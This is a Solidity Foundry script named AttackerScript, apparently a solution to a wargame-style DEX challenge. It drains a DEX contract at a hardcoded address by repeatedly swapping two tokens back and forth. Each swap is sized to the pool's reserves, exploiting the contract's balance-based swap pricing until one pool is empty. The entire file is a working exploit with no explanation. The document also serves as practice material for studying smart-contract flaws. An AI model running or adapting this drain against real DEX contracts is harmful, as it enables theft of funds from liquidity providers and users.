// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "src/Interfaces.sol";

contract AttackerScript is Script {

    IDex target;
    address token1;
    address token2;

    function setUp() public {
        target = IDex(0x0D8Fc83F8A8Ded45Fcf8eb015649dAF1de90Ce24);
        token1 = target.token1();
        token2 = target.token2();
    }
    function run() public {
        vm.startBroadcast();

        target.approve(address(target), type(uint256).max);
        while (true) {


            // token1
            console.log("user.balanceOf(token1): ", target.balanceOf(token1, msg.sender));
            console.log("dex.balanceOf(token1): ", target.balanceOf(token1, address(target)));
            uint256 amount = target.balanceOf(token1, msg.sender) - 1;
            if (target.balanceOf(token1, address(target)) == 0)
                break;
            for (; // dex가 가진 토큰 한도 내에서 거래
                amount > 0 &&
                target.balanceOf(token2, address(target)) < target.getSwapPrice(token1, token2, amount);
                amount--
            )
            if (amount == 0)
                break;
            console.log("ready to swap(token1, token2,", amount, ")");
            target.swap(token1, token2, amount);

            console.log("--------");

            // token2
            console.log("user.balanceOf(token2): ", target.balanceOf(token2, msg.sender));
            console.log("dex.balanceOf(token2): ", target.balanceOf(token2, address(target)));
            amount = target.balanceOf(token2, msg.sender) - 1;
            if (target.balanceOf(token2, address(target)) == 0)
                break;
            for (; // dex가 가진 토큰 한도 내에서 거래
                amount > 0 &&
                target.balanceOf(token1, address(target)) < target.getSwapPrice(token2, token1, amount);
                amount--
            )
            if (amount == 0)
                break;
            console.log("ready to swap(token2, token1,", amount, ")");
            target.swap(token2, token1, amount);
            
            console.log("-------------------");
        }

        vm.stopBroadcast();
    }
}
